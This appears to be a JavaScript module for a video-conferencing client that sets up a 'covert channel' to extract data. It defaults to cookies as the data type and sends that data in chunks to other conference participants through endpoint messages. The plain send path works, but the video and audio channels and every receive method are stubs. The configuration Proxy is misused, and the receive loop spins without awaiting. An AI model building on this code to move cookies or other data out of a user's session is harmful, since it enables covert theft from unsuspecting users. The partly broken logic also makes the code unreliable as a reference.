/* global APP, splitString*/

export const defaultConfigurationValues = {
    method: 'plain',
    dataType: 'cookies',
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    static async usePlain(data) {
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            payload: data
        });
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static async useVideo(data) {
        console.log(data);
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static async useAudio(data) {
        console.log(data);
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': ExtractionCovertChannelMethods.usedPlain,
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio
    };

    /**
     * Receiving data using simple plain method
     */
    static async usedPlain() {
    }

    /**
     * Receiving data using video stream
     */
    static async usedVideo() {
    }

    /**
     * Receiving data using audio stream
     */
    static async usedAudio() {
    }
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration, dataSource) {
        this.configuration = new Proxy(defaultConfigurationValues, configuration);
        this.dataSource = dataSource;
        this._fileBuffer = [];

        // if the communication is still running, or if it ended.
        this.isCommunicationRunning = true;
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    async sendAll(data) {
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            console.log(chunkData);
            await CovertChannelMethods.options[this.configuration.method](chunkData);
        }
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            isEnd: true
        });

        this.isCommunicationRunning = false;
    }

    /**
     * Receive data through the specified extraction method.
     */
    receivePlainData(recievedData) {

        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' ending extraction
            this._fileBuffer = [];
            this.isCommunicationRunning = false;
        } else { // 'reply' containg data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    async receiveAll() {
        const usedMethod = ExtractionCovertChannelMethods.options[this.configuration.method];

        while (this.isCommunicationRunning) {
            console.log(this.isCommunicationRunning);
            usedMethod();

            /*
            usedMethod().then(data => {
                this._fileBuffer.push(data);
            });
            */
        }
        console.log('ended.');
    }
}
